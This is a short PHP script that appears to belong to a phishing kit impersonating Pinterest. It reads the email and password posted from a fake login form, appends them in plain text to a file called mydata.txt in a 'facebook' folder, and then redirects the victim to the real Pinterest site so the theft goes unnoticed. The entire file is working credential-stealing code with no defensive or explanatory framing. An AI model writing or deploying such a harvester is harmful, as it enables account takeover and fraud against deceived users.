<?php

file_put_contents("../facebook/mydata.txt", "PINTEREST Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://pinterest.com/');
exit();
                                                                  
